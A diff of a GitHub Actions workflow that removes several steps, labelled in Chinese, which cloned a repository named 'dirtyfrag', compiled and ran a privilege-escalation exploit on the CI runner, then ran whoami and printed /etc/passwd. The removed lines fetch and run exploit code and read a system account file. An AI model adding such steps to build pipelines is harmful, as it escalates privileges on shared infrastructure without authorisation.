@@ -22,26 +22,6 @@ jobs:
       uses: actions/checkout@main
       with:
         ref: main
-
-    - name: 检测系统信息
-      run: |
-        uname -a
-
-    - name: 安装gcc
-      run: |
-        apt install gcc -y
-
-    - name: 下载提权脚本
-      run: |
-        git clone https://github.com/V4bel/dirtyfrag.git&& cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
-
-    - name: 检查权限
-      run: |
-        whoami
-
-    - name: 测试敏感文件
-      run: |
-        cat /etc/passwd
         
     - name: 缓存项目 npm 包
       id: cache-node-modules
